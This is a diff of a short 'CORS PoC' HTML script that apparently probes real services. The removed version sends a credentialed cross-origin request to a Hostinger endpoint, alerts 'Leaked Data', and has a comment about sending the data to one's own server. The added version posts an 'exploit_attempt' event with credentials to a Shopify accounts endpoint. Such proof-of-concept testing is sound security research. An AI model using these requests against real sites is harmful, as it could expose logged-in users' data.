@@ -1,21 +1,16 @@
-<!DOCTYPE html>
-<html>
-<head><title>CORS PoC</title></head>
-<body>
 <script>
-  fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
-    method: "GET",
-    headers: {
-      "X-Custom-Header": "abc"
-    },
-    credentials: "include"
+fetch("https://accounts.shopify.com/.well-known/dux", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    events: [{ name: "exploit_attempt", timestamp: Date.now() }]
   })
-  .then(res => res.text())
-  .then(data => {
-    // Send data back to your own server or just show it
-    alert("Leaked Data: " + data);
-  })
-  .catch(err => console.error("Request failed:", err));
+})
+.then(res => res.text())
+.then(data => {
+  alert("Response: " + data);
+});
 </script>
-</body>
-</html>
